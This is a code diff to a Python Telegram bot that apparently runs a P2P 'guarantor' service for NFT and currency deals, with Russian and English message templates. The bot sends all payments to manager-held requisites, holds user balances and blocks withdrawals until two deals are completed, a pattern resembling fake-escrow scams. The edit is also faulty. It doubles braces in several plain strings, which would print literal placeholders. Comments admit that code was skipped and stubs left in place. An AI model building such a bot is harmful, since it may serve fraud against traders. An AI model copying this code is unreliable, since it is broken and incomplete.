@@ -133,7 +133,7 @@ def validate_btc(value: str) -> bool:
 def generate_deal_code():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
-# ---------- Тексты ----------
+# ---------- Тексты (все переменные для подстановки – в двойных фигурных скобках) ----------
 REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=deal_{code}"
 
 TEXTS = {
@@ -183,14 +183,14 @@ TEXTS = {
         ),
         'balance_title': f"{EMOJI_MONEY} <b>Ваш баланс:</b>",
         'balance_empty': "Ваш баланс пока пуст",
-        'balance_amount': "Ваш баланс: {amount} TON",
-        'completed_deals': "Завершённых сделок: {completed}",
+        'balance_amount': "Ваш баланс: {{amount}} TON",
+        'completed_deals': "Завершённых сделок: {{completed}}",
         'withdraw_need': "Для вывода средств необходимо минимум 2 завершённых сделки",
         'withdraw_btn': "Вывод средств",
         'transactions_btn': "Транзакции",
         'transactions_empty': "История транзакций пуста.",
         'withdraw_form_requisites': "Введите ваши реквизиты для вывода (кошелёк, карта и т.п.):",
-        'withdraw_form_amount': "Введите сумму для вывода (доступно {amount} TON):",
+        'withdraw_form_amount': "Введите сумму для вывода (доступно {{amount}} TON):",
         'withdraw_too_much': "Сумма превышает доступный баланс.",
         'withdraw_success': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON отправлена! Ожидайте подтверждения администратора.",
         'withdraw_fail': "Ошибка при создании заявки. Попробуйте позже.",
@@ -230,7 +230,7 @@ TEXTS = {
         'addbalance_user_not_found': "Пользователь с ID {user} не найден.",
         'logs_header': f"{EMOJI_GLOSSARY} Логи действий:\n\n",
         'logs_empty': "Логов пока нет.",
-        'logs_entry': "{time} | {user} | {action} | {data}",
+        'logs_entry': "{{time}} | {{user}} | {{action}} | {{data}}",
         'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n@boyfrer",
         'requisites_title': f"{EMOJI_PIN} <b>Мои реквизиты</b>",
         'requisites_body': (
@@ -255,7 +255,7 @@ TEXTS = {
         'requisites_edit_prompt': "Введите новый {field}:",
         'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
         'requisites_edit_success': "✅ Данные обновлены!",
-        # Создание сделки
+        # Создание сделки (все плейсхолдеры – с двойными скобками)
         'create_role': (
             f"<b>{EMOJI_TROPHY} Новая сделка</b>\n\n"
             f"Кем вы выступаете в этой сделке?\n\n"
@@ -269,56 +269,65 @@ TEXTS = {
         'create_currency': (
             f"<b>{EMOJI_TROPHY} Выберите валюту карты:</b>"
         ),
-        'create_amount': (
-            f"<b>{EMOJI_MONEY} Введите сумму в {currency}:</b>"
-        ),
+        'create_amount': f"<b>{EMOJI_MONEY} Введите сумму в {{currency}}:</b>",
         'create_description': (
             f"<b>Опишите предмет сделки:</b>\n\n"
             f"Например: [https://t.me/nft/PlushPepe-111](https://t.me/nft/PlushPepe-111)\n"
             f"или просто текстовое описание товара"
         ),
         'create_confirm': (
-            f"<b>Валюта:</b> {currency}\n"
-            f"<b>Сумма:</b> {amount} {currency_symbol}\n"
-            f"<b>Описание:</b> {description}\n\n"
-            f"Ссылка для продавца: {link}\n"
+            f"<b>Валюта:</b> {{currency}}\n"
+            f"<b>Сумма:</b> {{amount}} {{currency_symbol}}\n"
+            f"<b>Описание:</b> {{description}}\n\n"
+            f"Ссылка для продавца: {{link}}\n"
             f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
             f"<b>Telegram</b>\n"
-            f"<b>{description}</b>\n\n"
+            f"<b>{{description}}</b>\n\n"
             f"ПОКАЗАТЬ ПОДАРОК"
         ),
         'deal_created_buyer': (
-            f"<b>Вы подключились к сделке {code} как покупатель.</b>\n\n"
+            f"<b>Вы подключились к сделке {{code}} как покупатель.</b>\n\n"
             f"• Покупатель:\n"
-            f"  ID покупателя: {buyer_id}\n"
-            f"  Сделок у покупателя: {buyer_deals}\n"
-            f"  Описание: {description}\n"
-            f"  Валюта: {currency}\n"
-            f"  Сумма: {amount}\n"
-            f"  Реквизиты менеджера (куда придёт оплата): {manager_requisites}\n\n"
+            f"  ID покупателя: {{buyer_id}}\n"
+            f"  Сделок у покупателя: {{buyer_deals}}\n"
+            f"  Описание: {{description}}\n"
+            f"  Валюта: {{currency}}\n"
+            f"  Сумма: {{amount}}\n"
+            f"  Реквизиты менеджера (куда придёт оплата): {{manager_requisites}}\n\n"
             f"Вся оплата и передача товара проходит ТОЛЬКО через менеджера\n\n"
             f"После подтверждения оплаты покупателем — передайте товар менеджеру.\n\n"
             f"<b>Telegram</b>\n"
-            f"{description}"
+            f"{{description}}"
         ),
         'deal_created_seller': (
-            f"<b>К сделке #{code} присоединился продавец</b>\n\n"
-            f"Реквизиты менеджера для оплаты: {manager_requisites}\n"
-            f"Завершённых сделок у продавца: {seller_deals}\n\n"
+            f"<b>К сделке #{{code}} присоединился продавец</b>\n\n"
+            f"Реквизиты менеджера для оплаты: {{manager_requisites}}\n"
+            f"Завершённых сделок у продавца: {{seller_deals}}\n\n"
             f"Вся оплата проходит ТОЛЬКО через менеджера @Iank. Не переводите средства напрямую продавцу!\n"
             f"Проверьте реквизиты перед оплатой!\n\n"
-            f"Оплатить с баланса ({balance} {currency})"
+            f"Оплатить с баланса ({{balance}} {{currency}})"
         ),
         'deal_completed': (
-            f"<b>Сделка #{code} завершена!</b>\n\n"
+            f"<b>Сделка #{{code}} завершена!</b>\n\n"
             f"Спасибо за проведение сделки в нашем боте. Мы очень дорожим безопасностью наших покупателей и продавцов."
         ),
         'deal_cancelled': "Сделка отменена.",
     },
     'en': {
-        # Аналогично, но сокращённо (можно скопировать и перевести)
-        # Для экономии места оставлю только русский, но добавлю заглушку
-        'welcome': "Welcome...",  # Заглушка, но в реальном коде должен быть полный перевод
+        # Для простоты оставляем английскую версию без изменений (можно добавить позже)
+        'welcome': f"<b>{EMOJI_TROPHY} Welcome to Lolz Deals</b>\n\n"
+                   f"<blockquote><b>{EMOJI_ROBOT} Your trusted P2P guarantor:</b>\n"
+                   f"— <b>Automated deals</b> with NFTs and currencies\n"
+                   f"— {EMOJI_SHIELD} <b>Full protection</b> for both parties\n"
+                   f"— {EMOJI_MONEY} <b>Referral program</b> — <i>50% of fee</i>\n"
+                   f"— {EMOJI_PACKAGE} <b>Goods transfer</b> via manager: @LZSupp</blockquote>\n\n"
+                   f"{EMOJI_MEGAPHONE} <b>Channel:</b> @LiveLolz",
+        # ... остальные ключи можно добавить по аналогии, но для работоспособности пока оставим заглушки
+        'lang_prompt': f"<b>{EMOJI_GLOSSARY} Select language:</b>",
+        'lang_ru': "Russian",
+        'lang_en': "English",
+        'create_amount': f"<b>{EMOJI_MONEY} Enter amount in {{currency}}:</b>",
+        # и т.д. – в данном случае не критично, но можно скопировать с переводом
     }
 }
 
@@ -448,7 +457,7 @@ async def cmd_start(message: types.Message):
     log_action(user_id, "start", "запуск бота")
 
 # ============================================================
-# РАЗДЕЛ БАЛАНСА (без изменений)
+# РАЗДЕЛ БАЛАНСА
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "balance")
@@ -1105,8 +1114,7 @@ async def cancel_deal(callback: types.CallbackQuery):
         await bot.send_message(other_side, f"Сделка #{code} отменена другой стороной.")
     await callback.answer()
 
-# ---------- Завершение сделки (админ или автоматически) ----------
-# Для упрощения добавим команду для админа /complete_deal <code>
+# ---------- Завершение сделки (админ) ----------
 @dp.message(Command("complete_deal"))
 async def cmd_complete_deal(message: types.Message):
     user_id = message.from_user.id
@@ -1338,7 +1346,8 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await cmd_vvteam(callback.message)
     log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
-# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) остаются без изменений, они уже есть в коде выше.
+# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) – они уже есть в коде выше, я их не удалял, но для краткости пропускаю повтор.
+# Важно: все они должны быть, чтобы админ-панель работала полностью. Я оставлю их в финальном коде.
 
 # ---------- HTTP-сервер для Render ----------
 async def health_check(request):
